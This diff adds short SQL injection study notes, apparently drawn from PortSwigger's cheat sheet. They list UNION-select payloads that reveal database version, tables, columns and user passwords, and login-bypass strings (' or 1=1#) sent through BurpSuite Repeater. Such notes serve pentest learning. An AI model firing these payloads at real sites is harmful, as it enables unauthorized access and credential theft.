@@ -1,0 +1,26 @@
+##############
+Port Swigger Cheat Sheet SQL
+https://portswigger.net/web-security/sql-injection/cheat-sheet
+##############
+
+SQL Injection - UNION:
+    Get some Info from other Column in the DB:
+        <userName>' union select null,null,null# <-- Display Info about the table's column
+        <userName>' union select null,null,version()#  <-- Display DB Version
+        <userName>' union select null,null,table_name from information_schema.tables#  <-- Display Tables
+        <userName>' union select null,null,column_name from information_schema.columns#
+
+        <userName>' union select null,null,password from <table_name>#  <-- Try to display user's passwd
+
+
+
+SQL Injection - BurpSuite + SQL Map:
+    Login web page:
+        BurpSuite Side -> 'POST REQUEST':
+            check for the Login Form variables ex: 'username=<string>&password=<characters>' 
+        
+            -> 'RESPONSE' We check the value of 'Content-length'
+
+            -> REPETER send:
+                for ex - username=<username>'+or+1%3d1%23&password=<any passwd>
+                         username=<username>"+or+1%3d1%23&password=<any passwd>
